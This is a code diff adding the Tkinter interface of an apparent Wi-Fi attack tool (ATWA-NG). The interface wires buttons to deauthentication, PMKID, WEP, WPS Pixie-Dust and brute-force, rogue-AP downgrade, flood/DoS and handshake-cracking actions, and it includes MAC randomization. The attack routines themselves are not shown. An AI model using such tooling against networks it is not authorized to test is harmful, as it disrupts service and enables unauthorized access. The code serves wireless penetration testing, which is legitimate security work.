+        # had before, when it was fixed by splitting these into two rows).
+        title_row = ttk.Frame(parent)
+        title_row.pack(fill=tk.X)
+        self.target_title_var = tk.StringVar(value="No target selected")
+        ttk.Label(title_row, textvariable=self.target_title_var, style="Heading.TLabel").pack(side=tk.LEFT)
+
+        # Target box: one field per line (v1 reference: "look how much info
+        # is on the target window" -- ESSID/BSSID's separate outer heading
+        # above still covers those two, so this focuses on everything else).
+        # Lock status is a plain color-coded line here, not a separate
+        # filled pill (2026-08-27 user report, same reasoning as the
+        # toolbar's monitor-status pill removal).
+        target_box = ttk.LabelFrame(parent, text="Target")
+        target_box.pack(fill=tk.X, pady=(4, 4))
+        self.lock_status_label = tk.Label(
+            target_box, textvariable=self.channel_lock_var, bg=self.THEME["bg"], fg=self.THEME["error"],
+            font=self.fonts["ui_bold"], anchor=tk.W,
+        )
+        self.lock_status_label.pack(fill=tk.X, padx=6, pady=(4, 0))
+        self.target_detail_var = tk.StringVar(value="Select a target from the list on the left.")
+        ttk.Label(target_box, textvariable=self.target_detail_var, justify=tk.LEFT).pack(
+            anchor=tk.W, padx=6, pady=(2, 0))
+        self.capture_size_var = tk.StringVar(value="")
+        ttk.Label(target_box, textvariable=self.capture_size_var, style="Muted.TLabel").pack(
+            anchor=tk.W, padx=6, pady=(0, 4))
+
+        clients_box = ttk.LabelFrame(parent, text="Clients")
+        clients_box.pack(fill=tk.X, pady=(0, 4))
+        client_frame = ttk.Frame(clients_box)
+        client_frame.pack(fill=tk.X, padx=4, pady=4)
+        self.client_tree = ttk.Treeview(
+            client_frame, columns=("station", "signal"), show="headings", height=3, selectmode="browse",
+        )
+        self.client_tree.heading("station", text="Station")
+        self.client_tree.column("station", width=160, minwidth=120)
+        self.client_tree.heading("signal", text="Signal")
+        self.client_tree.column("signal", width=70, minwidth=50)
+        self.client_tree.tag_configure("row_even", background=self.THEME["tree_bg"], foreground=self.THEME["fg"])
+        self.client_tree.tag_configure("row_odd", background=self.THEME["tree_band"], foreground=self.THEME["fg"])
+        self.client_tree.bind("<Button-3>", self._on_client_right_click)
+        client_vsb = ttk.Scrollbar(client_frame, orient=tk.VERTICAL, command=self.client_tree.yview)
+        self.client_tree.configure(yscrollcommand=client_vsb.set)
+        self.client_tree.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        client_vsb.pack(side=tk.LEFT, fill=tk.Y)
+
+        # Boxed like Target/Clients/Attacks/Captures -- this was the one
+        # right-side element with no border at all (2026-08-27 user
+        # report: "the right side... needs more outlines").
+        graph_box = ttk.LabelFrame(parent, text="Signal History")
+        graph_box.pack(fill=tk.X, pady=(0, 4))
+        graph_frame = ttk.Frame(graph_box, style="Panel.TFrame")
+        graph_frame.pack(fill=tk.X, padx=4, pady=4)
+        self.signal_graph = SignalGraph(graph_frame)
+
+        auto_row = ttk.Frame(parent)
+        auto_row.pack(fill=tk.X, pady=(0, 4))
+        self.auto_deauth_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(auto_row, text="Auto-deauth until handshake", variable=self.auto_deauth_var,
+                        command=self._toggle_auto_deauth).pack(side=tk.LEFT)
+        ttk.Label(auto_row, text="every").pack(side=tk.LEFT, padx=(10, 4))
+        self.deauth_interval_var = tk.StringVar(value="10")
+        ttk.Combobox(auto_row, textvariable=self.deauth_interval_var, state="readonly", width=4,
+                     values=("10", "30", "60")).pack(side=tk.LEFT)
+        ttk.Label(auto_row, text="s").pack(side=tk.LEFT, padx=(2, 0))
+
+        attacks_box = ttk.LabelFrame(parent, text="Attacks")
+        attacks_box.pack(fill=tk.X, pady=(0, 4))
+        # Stop Attack pinned at the top of the list, not mixed into
+        # self.attack_buttons below -- it must stay clickable while
+        # _set_busy(True) disables every other attack button, since its
+        # whole job is interrupting one that's already running.
+        ttk.Button(attacks_box, text="Stop Attack", command=self._stop_attack, style="Danger.TButton").pack(
+            fill=tk.X, padx=4, pady=(4, 4))
+        # Smart/OMNI/Dragonblood pulled out of this grid (2026-09-12 user
+        # request) into their own full-width rows below it -- besides the
+        # requested visual promotion, it also fixes a leftover blank grid
+        # cell: an odd number of entries in a 2-column grid leaves the last
+        # row alone with an empty neighbor. The grid below holds 14 entries
+        # (7 even rows), and CHAOS was added to the full-width chain group
+        # rather than the grid so it stays even (2026-09-26).
+        buttons = [
+            ("Deauth All Clients", self._attack_deauth_all, "TButton"),
+            ("Deauth Selected Client", self._attack_deauth_client, "TButton"),
+            ("PMKID Attack (Clientless)", self._attack_pmkid, "TButton"),
+            ("Handshake Capture", self._attack_handshake, "TButton"),
+            ("WEP Attack", self._attack_wep, "TButton"),
+            ("WEP Caffe Latte", self._attack_caffe_latte, "TButton"),
+            ("WEP Hirte", self._attack_hirte, "TButton"),
+            ("WEP Chopchop", self._attack_chopchop, "TButton"),
+            ("WPS Null-PIN", self._attack_wps_null_pin, "TButton"),
+            ("WPS Pixie-Dust", self._attack_wps_pixie, "TButton"),
+            ("WPS Bruteforce (experimental)", self._attack_wps_bruteforce, "TButton"),
+            "rogue_ap_menu",
+            ("Online Password Guess", self._attack_online_guess, "TButton"),
+            "flood_menu",
+        ]
+        # 2-column grid instead of one-per-row: halves the panel's total
+        # height, which is what was pushing WPS/Rogue-AP/Online-Guess (and
+        # Captures below them) off the bottom of the window at normal sizes
+        # (2026-08-28 user report: "resizing makes hidden buttons appear").
+        attack_grid = ttk.Frame(attacks_box)
+        attack_grid.pack(fill=tk.X, padx=2, pady=(0, 1))
+        attack_grid.columnconfigure(0, weight=1)
+        attack_grid.columnconfigure(1, weight=1)
+        self.attack_buttons: list[ttk.Button] = []
+        for i, entry in enumerate(buttons):
+            if entry == "rogue_ap_menu":
+                # Portal-free rogue-AP variants share one compact menu.
+                rogue_ap_menu = tk.Menu(attack_grid, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+                rogue_ap_menu.add_command(label="Downgrade Twin", command=self._attack_downgrade_twin)
+                rogue_ap_menu.add_command(label="OWE Downgrade", command=self._attack_owe_downgrade)
+                b = ttk.Menubutton(attack_grid, text="Rogue AP ▾", menu=rogue_ap_menu, style="TMenubutton")
+                b.rogue_ap_menu = rogue_ap_menu  # keep the Menu alive with the widget
+            elif entry == "flood_menu":
+                # Five protocol-disruption/DoS attacks (v2.4) collapsed into
+                # one dropdown, same reasoning as the Rogue AP menu above -- each is
+                # a one-off action against the current target, not worth a
+                # full grid cell of its own.
+                flood_menu = tk.Menu(attack_grid, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+                flood_menu.add_command(label="CSA Spoof (channel redirect)", command=self._attack_csa_spoof)
+                flood_menu.add_command(label="EAPOL-Start Flood", command=self._attack_eapol_flood)
+                flood_menu.add_command(label="Auth Flood", command=self._attack_auth_flood)
+                flood_menu.add_command(label="Beacon Flood", command=self._attack_beacon_flood)
+                flood_menu.add_command(label="TKIP MIC Flood", command=self._attack_tkip_mic_flood)
+                b = ttk.Menubutton(attack_grid, text="Flood / DoS ▾", menu=flood_menu, style="TMenubutton")
+                b.flood_menu = flood_menu  # keep the Menu alive with the widget
+            else:
+                label, cmd, style = entry
+                b = ttk.Button(attack_grid, text=label, command=cmd, style=style)
+            b.grid(row=i // 2, column=i % 2, sticky="ew", padx=2, pady=1)
+            self.attack_buttons.append(b)
+
+        # Smart/OMNI/CHAOS promoted to full-width rows below the grid, same
+        # width as Dragonblood/PINCER (2026-09-12 user request) -- these are
+        # the "run a whole chain" attacks, not one-off actions, so they get
+        # the same visual weight as PINCER rather than sharing a half-width
+        # grid cell with e.g. "WEP Chopchop".
+        for label, cmd in (
+            ("Smart Attack (Auto)", self._attack_smart),
+            ("OMNI Attack (All Stages)", self._attack_omni),
+            ("CHAOS Flood (All Vectors)", self._attack_chaos),
+        ):
+            b = ttk.Button(attacks_box, text=label, command=cmd, style="Accent.TButton")
+            b.pack(fill=tk.X, padx=4, pady=1)
+            self.attack_buttons.append(b)
+
+        # PINCER kept out of self.attack_buttons: it needs a second enable
+        # condition (a detected dual-Alfa pair) that _set_busy()'s blanket
+        # NORMAL-on-idle reset would otherwise clobber -- see _set_busy()
+        # and _refresh_adapters() for where its state actually gets set.
+        # Styled to match Smart/OMNI's accent color (2026-09-12 user
+        # request) with a bigger font + a pincer emoji, same treatment as
+        # Dragonblood's own icon+color identity below.
+        self.pincer_button = ttk.Button(
+            attacks_box, text="🦀 PINCER (Dual-Alfa)", command=self._attack_pincer, state=tk.DISABLED,
+            style="PincerAccent.TButton",
+        )
+        self.pincer_button.pack(fill=tk.X, padx=4, pady=1)
+
+        # Dragonblood last (2026-09-12 user request: swap with PINCER so
+        # Dragonblood sits at the very bottom) -- it's experimental, so it
+        # gets the final slot rather than sharing the grid with routine
+        # actions.
+        dragonblood_btn = ttk.Button(
+            attacks_box, text="🩸 Dragonblood (unverified)", command=self._attack_dragonblood, style="Blood.TButton",
+        )
+        dragonblood_btn.pack(fill=tk.X, padx=4, pady=(1, 4))
+        self.attack_buttons.append(dragonblood_btn)
+
+    def _build_captures_panel(self, parent):
+        opts_row = ttk.Frame(parent)
+        opts_row.pack(fill=tk.X, padx=4, pady=(4, 6))
+        ttk.Label(opts_row, text="Capture dir:").grid(row=0, column=0, sticky=tk.W, pady=2)
+        ttk.Entry(opts_row, textvariable=self.capture_dir_var, width=40).grid(row=0, column=1, sticky=tk.EW, padx=6)
+        ttk.Button(opts_row, text="Browse", command=self._choose_capture_dir).grid(row=0, column=2)
+        ttk.Label(opts_row, text="Wordlist:").grid(row=1, column=0, sticky=tk.W, pady=2)
+        ttk.Entry(opts_row, textvariable=self.wordlist_var, width=40).grid(row=1, column=1, sticky=tk.EW, padx=6)
+        ttk.Button(opts_row, text="Browse", command=self._choose_wordlist).grid(row=1, column=2)
+        # minsize floor -- without it, grid shrinks this column straight to
+        # 0 (entry fully invisible, label butted against Browse) once the
+        # right pane gets narrow, instead of just truncating the text
+        # (2026-08-28 user report: fields vanishing on resize).
+        opts_row.columnconfigure(1, weight=1, minsize=100)
+
+        # Crack w/ John and Crack w/ Aircrack pulled out of the action grid
+        # below into their own full-width row -- these are THE two primary
+        # crack actions (the folder-picker dialog that used to occupy the
+        # prominent accent-button slot was removed as redundant with this
+        # panel's own file list), so they get the visual weight instead of
+        # being sized identically to Refresh/Copy Path/etc.
+        crack_row = ttk.Frame(parent)
+        crack_row.pack(fill=tk.X, padx=4, pady=(0, 4))
+        john_btn = ttk.Button(crack_row, text="Crack w/ John", command=self._capture_crack_john,
+                              style="Accent.TButton")
+        john_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
+        aircrack_btn = ttk.Button(crack_row, text="Crack w/ Aircrack", command=self._capture_crack_aircrack,
+                                  style="Accent.TButton")
+        aircrack_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(2, 0))
+        self.capture_buttons.extend((john_btn, aircrack_btn))
+
+        # Wrapping grid, not a single pack(side=LEFT) row -- 9 buttons in one
+        # unwrapped row ran off the right edge with no way to reach the last
+        # few short of the Captures menu (2026-08-28 user report: "captures
+        # tab still has hidden buttons"). Fixed column count wraps them onto
+        # as many rows as needed instead of however wide the window happens
+        # to be.
+        actions = ttk.Frame(parent)
+        actions.pack(fill=tk.X, padx=4, pady=(0, 4))
+        action_defs = [
+            ("Refresh", self._refresh_captures, "TButton"),
+            ("Inspect", self._capture_inspect, "TButton"),
+            ("Inspect All", self._capture_inspect_all, "TButton"),
+            ("Convert to 22000", self._capture_convert, "TButton"),
+            ("Fix", self._capture_fix, "TButton"),
+            ("Merge (2+)", self._capture_merge, "TButton"),
+            ("Crack Selected", self._capture_crack, "TButton"),
+            ("Copy Path", self._capture_copy_path, "TButton"),
+            ("Benchmark (John)", self._capture_benchmark_john, "TButton"),
+            ("Stop Cracking", self._stop_cracking, "Danger.TButton"),
+            ("Cleanup Handshakes...", self._capture_cleanup, "Danger.TButton"),
+        ]
+        # 6 per row: 11 buttons -> 1 full row + a 5-button last row, which
+        # the last-row-span logic below stretches its last button across
+        # the remaining column (see that logic's own comment for why a
+        # short last row needs it). Crack w/ John and Crack w/ Aircrack
+        # aren't in this grid -- they get their own full-width row above,
+        # see crack_row.
+        actions_per_row = 6
+        n = len(action_defs)
+        for col in range(actions_per_row):
+            actions.columnconfigure(col, weight=1)
+        for i, (label, cmd, style) in enumerate(action_defs):
+            row, col = divmod(i, actions_per_row)
+            # Last button spans the remaining columns when its row is short
+            # a full set -- otherwise it sits at its natural width with dead
+            # space stretching out past it instead of reaching the row's
+            # right edge like every full row does (2026-08-28 user report:
+            # "wasted space after the red crack button").
+            row_is_short = (n - row * actions_per_row) < actions_per_row
+            span = actions_per_row - col if (i == n - 1 and row_is_short) else 1
+            btn = ttk.Button(actions, text=label, command=cmd, style=style)
+            btn.grid(row=row, column=col, columnspan=span, sticky="ew", padx=2, pady=2)
+            if label != "Stop Cracking":
+                self.capture_buttons.append(btn)
+
+        # Horizontal scrollbar packed before tree_frame claims the bottom
+        # strip first (same ordering as the target tree above) -- packing
+        # it after would leave it no space once tree_frame's fill=BOTH/
+        # expand=True already claimed everything.
+        capture_hsb = ttk.Scrollbar(parent, orient=tk.HORIZONTAL)
+        capture_hsb.pack(fill=tk.X, padx=4)
+
+        tree_frame = ttk.Frame(parent)
+        tree_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))
+        cols = [c[0] for c in CAPTURE_COLUMNS]
+        self.capture_tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="extended", height=6)
+        for key, heading, width in CAPTURE_COLUMNS:
+            self.capture_tree.heading(key, text=heading)
+            # stretch=False on every column but CAPTURE_STRETCH_COLUMN: same
+            # fix as the target tree -- without it ttk auto-compresses every
+            # column to fit the visible width instead of leaving them at
+            # their set width with a scrollbar, which is what was mangling
+            # "Kind"/"Size" headers into "Kin"/"Siz" on a narrow window
+            # (2026-08-28 user report). Path still stretches so slack width
+            # goes somewhere useful instead of sitting wasted.
+            self.capture_tree.column(key, width=width, minwidth=40, stretch=(key == CAPTURE_STRETCH_COLUMN))
+        # "bright" (white), not the standard blue body-text color -- same
+        # reasoning as the crack dialog's output Text widget (2026-08-28
+        # user report: "the captures list is STILL BLUE COLOR when it needs
+        # to be WHITE").
+        self.capture_tree.tag_configure("row_even", background=self.THEME["tree_bg"], foreground=self.THEME["bright"])
+        self.capture_tree.tag_configure("row_odd", background=self.THEME["tree_band"], foreground=self.THEME["bright"])
+        vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.capture_tree.yview)
+        capture_hsb.configure(command=self.capture_tree.xview)
+        self.capture_tree.configure(yscrollcommand=vsb.set, xscrollcommand=capture_hsb.set)
+        self.capture_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        vsb.pack(side=tk.RIGHT, fill=tk.Y)
+        self.capture_tree.bind("<Button-3>", self._on_capture_right_click)
+
+        # Own dedicated scroll, not the outer page's (2026-08-27 user
+        # report: "the handshakes box needs its own scroll bars") --
+        # naturally isolated from the Attacks pane's wheel-bind now that
+        # Captures lives in its own PanedWindow pane (2026-08-28 reskin),
+        # not inside the Attacks pane's scrollable canvas.
+        def on_capture_wheel(event):
+            if event.num == 5 or event.delta < 0:
+                self.capture_tree.yview_scroll(1, "units")
+            elif event.num == 4 or event.delta > 0:
+                self.capture_tree.yview_scroll(-1, "units")
+        self._bind_wheel_recursive(parent, on_capture_wheel)
+
+        self.root.after(50, self._refresh_captures)
+
+    def _build_log_pane(self, parent):
+        # Full-width bottom strip, always visible during attacks.
+        frame = ttk.Frame(parent)
+        frame.pack(side=tk.BOTTOM, fill=tk.X, pady=(6, 0))
+        ttk.Label(frame, text="Log", style="Muted.TLabel").pack(anchor=tk.W)
+        self.log_text = tk.Text(
+            frame, height=8, bg=self.THEME["panel_alt"], fg=self.THEME["fg"], insertbackground=self.THEME["fg"],
+            font=self.fonts["mono"], borderwidth=0, highlightthickness=1,
+            highlightbackground=self.THEME["border"], wrap=tk.WORD,
+        )
+        vsb = ttk.Scrollbar(frame, orient=tk.VERTICAL, command=self.log_text.yview)
+        self.log_text.configure(yscrollcommand=vsb.set, state=tk.DISABLED)
+        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        vsb.pack(side=tk.LEFT, fill=tk.Y)
+
+    def _build_status_bar(self):
+        bar = ttk.Frame(self.root, style="Status.TFrame", padding=(8, 3))
+        bar.pack(side=tk.BOTTOM, fill=tk.X)
+        ttk.Label(bar, textvariable=self.status_var, style="Toolbar.TLabel").pack(side=tk.LEFT)
+
+    # ------------------------------------------------------------------
+    # Background execution: run fn() off the UI thread, results/log lines
+    # come back through a queue drained on the Tk main loop via `after`.
+    # ------------------------------------------------------------------
+    def _check_for_updates(self):
+        from ..update_check import check_for_update
+
+        result = check_for_update(__version__, timeout=3.0)
+        if result.error:
+            self._queue.put(("log", f"update check unavailable: {result.error}"))
+        elif result.update_available:
+            self._queue.put(("update_available", result))
+
+    def _queue_scan_update(self):
+        """Coalesce scan refreshes when the Tk thread falls behind."""
+        with self._queue_coalesce_lock:
+            if self._scan_update_queued:
+                return
+            self._scan_update_queued = True
+        self._queue.put(("scan_update", None))
+
+    def _queue_signal_sample(self, value: int | None):
+        """Keep only the newest signal sample while the GUI is busy."""
+        with self._queue_coalesce_lock:
+            self._pending_signal_sample = value
+            if self._signal_sample_queued:
+                return
+            self._signal_sample_queued = True
+        self._queue.put(("signal_sample", None))
+
+    def _drain_queue(self):
+        # Reschedule in `finally`, not as the last line of a plain `try`:
+        # an exception raised while handling any one item (e.g. a race
+        # between this loop and a background thread mutating shared state)
+        # used to escape past the `except queue.Empty` below and skip the
+        # reschedule entirely, permanently killing all future log/status/
+        # busy updates for the rest of the process — confirmed live
+        # (2026-08-28), `_render_targets()` hit "dictionary changed size
+        # during iteration" once and every attack after that ran for real
+        # but never showed anything again until the GUI was restarted.
+        # Each item is now also handled in its own try/except so one bad
+        # item can't block the rest of the same batch either.
+        try:
+            while True:
+                try:
+                    kind, payload = self._queue.get_nowait()
+                except queue.Empty:
+                    break
+                try:
+                    if kind == "log":
+                        self._append_log(payload)
+                    elif kind == "status":
+                        self.status_var.set(payload)
+                    elif kind == "scan_update":
+                        with self._queue_coalesce_lock:
+                            self._scan_update_queued = False
+                        self._render_targets()
+                    elif kind == "signal_sample":
+                        with self._queue_coalesce_lock:
+                            sample = self._pending_signal_sample
+                            self._pending_signal_sample = None
+                            self._signal_sample_queued = False
+                        self.signal_graph.add_sample(sample)
+                    elif kind == "auto_deauth_done":
+                        self.auto_deauth_var.set(False)
+                    elif kind == "update_available":
+                        self._show_update_available(payload)
+                    elif kind == "capture_size":
+                        self.capture_size_var.set(self._format_capture_size(payload))
+                    elif kind == "busy":
+                        self._set_busy(payload)
+                    elif kind == "error":
+                        messagebox.showerror("ATWA-NG", payload)
+                    elif kind == "info":
+                        messagebox.showinfo("ATWA-NG", payload)
+                    elif kind == "captures_ready":
+                        self._populate_capture_tree(payload)
+                    elif kind == "task_result":
+                        result_kind, result = payload
+                        if result_kind == "inspect_all_done":
+                            self._on_inspect_all_done(result)
+                    elif kind == "ui":
+                        payload()  # generic "run this callable on the Tk thread" escape hatch
+                except Exception as exc:  # noqa: BLE001 - one bad queue item must not kill the drain loop
+                    self._append_log(f"    (internal) error handling {kind!r} update: {exc}")
+        finally:
+            self.root.after(100, self._drain_queue)
+
+    def _show_update_available(self, result):
+        message = f"ATWA-NG {result.latest} is available (installed: {result.current})."
+        if result.release_url:
+            message += f"\n\n{result.release_url}"
+        messagebox.showinfo("ATWA-NG update available", message)
+
+    def _append_log(self, msg: str):
+        self.log_text.configure(state=tk.NORMAL)
+        self.log_text.insert(tk.END, msg.rstrip() + "\n")
+        self.log_text.see(tk.END)
+        self.log_text.configure(state=tk.DISABLED)
+
+    def _log(self, msg: str):
+        self._queue.put(("log", msg))
+
+    def _set_busy(self, busy: bool):
+        self._busy = busy
+        state = tk.DISABLED if busy else tk.NORMAL
+        for b in self.attack_buttons:
+            b.configure(state=state)
+        for b in self.capture_buttons:
+            b.configure(state=state)
+        self.pincer_button.configure(state=tk.DISABLED if (busy or not self.alfa_pair) else tk.NORMAL)
+
+    def _runner(self) -> AttackRunner:
+        """Build an AttackRunner from current App state."""
+        from .attack_runner import AttackRunner
+
+        return AttackRunner(
+            mon_iface=self.mon_iface,
+            own_mac=self.own_mac,
+            capture_dir=self.capture_dir_var.get(),
+            wordlist=self.wordlist_var.get() or None,
+            stop_event=self._stop_event,
+            progress_fn=self._progress_fn,
+            log_fn=self._log,
+            watch_capture_fn=self._watch_capture_size,
+            crack_proc_holder=self._crack_proc_holder,
+            iface_ap=self.iface_ap_var.get().strip() or None,
+        )
+
+    def _run_bg(self, label: str, fn, *args, result_kind: str | None = None,
+                is_attack: bool = True, **kwargs):
+        """Run a background task and report its lifecycle to the GUI.
+
+        ``result_kind`` is for tasks whose result is a Tk-side operation (for
+        example opening the Inspect All result dialog).  Its result is queued
+        *after* the busy state is cleared, so a modal result window cannot
+        leave the GUI looking busy forever.
+        """
+        if self._busy:
+            messagebox.showwarning("ATWA-NG", "Another background operation is already running.")
+            return
+        # A prior attack's "Stop Attack" leaves this set; without clearing
+        # it here, every later attack that reads self._stop_event (Caffe
+        # Latte, Chopchop, rogue-AP workflows, Handshake Capture) would see itself
+        # as already-stopped and abort instantly.
+        self._stop_event.clear()
+        self._queue.put(("busy", True))
+        self._queue.put(("status", f"Running: {label}"))
+        self._log(f">>> {label}")
+        # Cheap, high-value sanity check: an attack that silently no-ops
+        # because mon_iface slipped out of monitor mode (a stuck driver
+        # state, a stray NetworkManager reclaim, etc.) looks identical in
+        # the log to "the attack ran and found nothing" without this —
+        # the single most confusing failure mode to diagnose blind.
+        # Skipped for "Start monitor mode" itself -- that's the one action
+        # whose entire job is to fix a not-yet-monitor-mode adapter, so
+        # this check used to fire a backwards "needs monitor mode" warning
+        # on the very call that establishes it (confirmed live, 2026-08-28).
+        if is_attack and self.mon_iface and "demo" not in self.mon_iface and label != "Start monitor mode":
+            try:
+                from ..radio import get_mode
+
+                mode = get_mode(self.mon_iface)
+                if mode != "monitor":
+                    self._log(f"    WARNING: {self.mon_iface} needs to be in monitor mode but is currently in '{mode}' mode — {label} will likely fail silently")
+                else:
+                    self._log(f"    {self.mon_iface}: monitor mode confirmed")
+            except Exception as exc:  # noqa: BLE001 - GUI must survive adapter-query errors
+                self._log(f"    could not check {self.mon_iface} mode: {exc}")
+
+        done = threading.Event()
+        _last_progress: list[str] = []
+
+        def progress_fn(msg: str) -> None:
+            """Attack functions call this to emit mid-run status lines."""
+            _last_progress.clear()
+            _last_progress.append(msg)
+            self._log(f"    {msg}")
+
+        # Expose progress_fn to work functions via a thread-local attribute
+        # so they can capture it without changing _run_bg's signature.
+        self._progress_fn = progress_fn
+
+        def heartbeat():
+            elapsed = 0
+            while not done.wait(10):
+                elapsed += 10
+                last = _last_progress[0] if _last_progress else None
+                if last:
+                    self._log(f"    [{elapsed}s] {last}")
+                else:
+                    self._log(f"    ... {label} still running ({elapsed}s)")
+
+        threading.Thread(target=heartbeat, daemon=True).start()
+
+        def worker():
+            result_delivered = False
+            try:
+                result = fn(*args, **kwargs)
+                self._log(f"<<< {label} done: {result if result is not None else 'ok'}")
+                if result_kind is not None:
+                    # Clear busy before a modal result handler runs.  The
+                    # drain loop cannot process queued busy=False while that
+                    # handler blocks on wait_window().
+                    self._queue.put(("busy", False))
+                    self._queue.put(("status", "Ready."))
+                    self._queue.put(("task_result", (result_kind, result)))
+                    result_delivered = True
+            except Exception as exc:  # noqa: BLE001 — surface every failure to the log/dialog
+                self._log(f"!!! {label} failed: {exc}")
+                self._queue.put(("error", f"{label} failed:\n{exc}"))
+            finally:
+                done.set()
+                if not result_delivered:
+                    self._queue.put(("busy", False))
+                    self._queue.put(("status", "Ready."))
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _run_capture_task(self, label: str, fn, *args, result_kind: str | None = None, **kwargs):
+        """Run a Captures-tab operation without attack/monitor semantics."""
+        self._run_bg(label, fn, *args, result_kind=result_kind, is_attack=False, **kwargs)
+
+    # ------------------------------------------------------------------
+    # Adapters / monitor mode
+    # ------------------------------------------------------------------
+    def _refresh_adapters(self):
+        from ..radio import detect_alfa_pair, detect_interfaces
+
+        try:
+            ifaces = detect_interfaces()
+        except Exception as exc:  # noqa: BLE001 - GUI must survive adapter-query errors
+            self._log(f"could not list adapters: {exc}")
+            ifaces = []
+
+        # Dropdown values are the short form (iface + vendor) only -- see
+        # the MAC-label comment where adapter_combo is built for why the
+        # MAC can't safely live inside a combobox value.
+        displays = [self._iface_display_short(i) for i in ifaces]
+        self._iface_display_to_name = dict(zip(displays, ifaces))
+        self._iface_short_display = {i: self._iface_display_short(i) for i in ifaces}
+        self.adapter_combo["values"] = displays
+        self.iface_ap_combo["values"] = displays
+
+        if ifaces and not self.adapter_var.get():
+            self.adapter_var.set(ifaces[0])
+        self._sync_iface_display(self.adapter_var, self.adapter_display_var)
+        self._update_adapter_mac_label()
+
+        saved_iface_ap = self.settings.get("iface_ap", "")
+        if saved_iface_ap and saved_iface_ap in ifaces:
+            self.iface_ap_var.set(saved_iface_ap)
+        elif not self.iface_ap_var.get() or self.iface_ap_var.get() not in ifaces:
+            # Rogue-AP workflows need a *second* interface distinct from the
+            # monitor/scan adapter to host the AP on — default to the
+            # first one that isn't already selected as the scan adapter.
+            others = [i for i in ifaces if i != self.adapter_var.get()]
+            self.iface_ap_var.set((others or ifaces or [""])[0])
+        self._sync_iface_display(self.iface_ap_var, self.iface_ap_display_var)
+
+        self.alfa_pair = detect_alfa_pair(ifaces)
+        state = tk.NORMAL if (self.alfa_pair and not self._busy) else tk.DISABLED
+        if hasattr(self, "pincer_menu_index"):
+            self.attack_menu.entryconfig(self.pincer_menu_index, state=state)
+        if hasattr(self, "pincer_button"):
+            self.pincer_button.configure(state=state)
+        if self.alfa_pair:
+            self._log(f"PINCER available: scan={self.alfa_pair[0]} attack={self.alfa_pair[1]}")
+
+    def _sync_iface_display(self, name_var: tk.StringVar, display_var: tk.StringVar):
+        """Point display_var at name_var's current bare iface name's SHORT
+        display string (iface + vendor, no MAC -- the collapsed field is
+        too narrow for the MAC too), falling back to the bare name itself
+        if it's not in the current interface list (e.g. nothing detected
+        yet). The dropdown *list* still shows the full iface+vendor+MAC
+        form via combo["values"] (2026-08-27 user request)."""
+        name = name_var.get()
+        display_var.set(self._iface_short_display.get(name, name))
+
+    @staticmethod
+    def _display_ssid(ssid: str) -> str:
+        """Render an SSID for the tree. Real, non-UTF8 SSIDs decode fine
+        (frames.py falls back to latin-1 so nothing crashes), but many of
+        those bytes are control/undefined codepoints that Tk renders as a
+        wall of missing-glyph boxes. Swap only the non-printable characters
+        for a single visible placeholder — display only, the underlying
+        ap.ssid stays untouched for attacks/captures/targeting."""
+        return "".join(c if c.isprintable() else "·" for c in ssid)
+
+    @staticmethod
+    def _vendor_label(driver: str | None) -> str:
+        """Rough driver-name -> vendor label, purely so wlan0/wlan1 in the
+        toolbar are visually distinguishable when both are present — not
+        an exhaustive chipset database, just the common driver prefixes."""
+        if not driver:
+            return "?"
+        d = driver.lower()
+        if d.startswith("mt"):
+            return "Mediatek"
+        if d.startswith(("rtl", "rtw")):
+            return "Realtek"
+        if d.startswith("ath"):
+            return "Atheros"
+        if d.startswith("iwl"):
+            return "Intel"
+        return driver
+
+    def _iface_display_short(self, iface: str) -> str:
+        from ..radio import get_driver
+
+        driver = get_driver(iface)
+        return f"{iface} ({self._vendor_label(driver)})" if driver else iface
+
+    def _update_adapter_mac_label(self):
+        """Refresh adapter_mac_var from the currently-selected adapter's MAC.
+        Kept out of the combobox value itself -- see the label comment next
+        to adapter_combo's construction."""
+        from ..radio import RadioError, get_mac
+
+        iface = self.adapter_var.get()
+        try:
+            self.adapter_mac_var.set(get_mac(iface) if iface else "")
+        except RadioError:
+            self.adapter_mac_var.set("")  # interface down/gone -- MAC just isn't shown
+
+    def _on_adapter_selected(self):
+        self.adapter_var.set(self._iface_display_to_name.get(self.adapter_display_var.get(), self.adapter_display_var.get()))
+        self._sync_iface_display(self.adapter_var, self.adapter_display_var)
+        self._update_adapter_mac_label()
+
+    def _on_iface_ap_selected(self):
+        self.iface_ap_var.set(self._iface_display_to_name.get(self.iface_ap_display_var.get(), self.iface_ap_display_var.get()))
+        self._sync_iface_display(self.iface_ap_var, self.iface_ap_display_var)
+        self._save_settings()
+
+    def _start_monitor(self):
+        iface = self.adapter_var.get()
+        if not iface:
+            messagebox.showwarning("ATWA-NG", "Select an adapter first.")
+            return
+
+        def work():
+            from ..radio import get_mac, set_monitor_mode
+
+            mon, permanent_mac = set_monitor_mode(iface, randomize_mac=self.randomize_mac_var.get())
+            mac = get_mac(mon)
+            self.mon_iface = mon
+            self.own_mac = mac
+            self._permanent_mac = permanent_mac
+            self._queue.put(("status", f"Monitor mode on {mon}"))
+            # Tk vars are NOT thread-safe -- set them on the Tk thread
+            # via the queue, not directly from this worker.
+            self._queue.put(("ui", lambda: self.mac_var.set(mac + (" (randomized)" if permanent_mac else ""))))
+            self._queue.put(("ui", lambda: self.monitor_status_var.set(f"MONITOR: {mon}")))
+            return mon
+
+        self._run_bg("Start monitor mode", work)
+
+    def _stop_monitor(self):
+        if not self.mon_iface:
+            return
+        iface = self.mon_iface
+        permanent_mac = self._permanent_mac
+
+        def work():
+            from ..radio import set_managed_mode
+
+            set_managed_mode(iface, restore_mac=permanent_mac)
+            self.mon_iface = None
+            self._permanent_mac = None
+            self._queue.put(("ui", lambda: self.monitor_status_var.set("MONITOR: OFF")))
+            return iface
+
+        self._run_bg("Stop monitor mode", work)
+
+    # ------------------------------------------------------------------
+    # Scanning
+    # ------------------------------------------------------------------
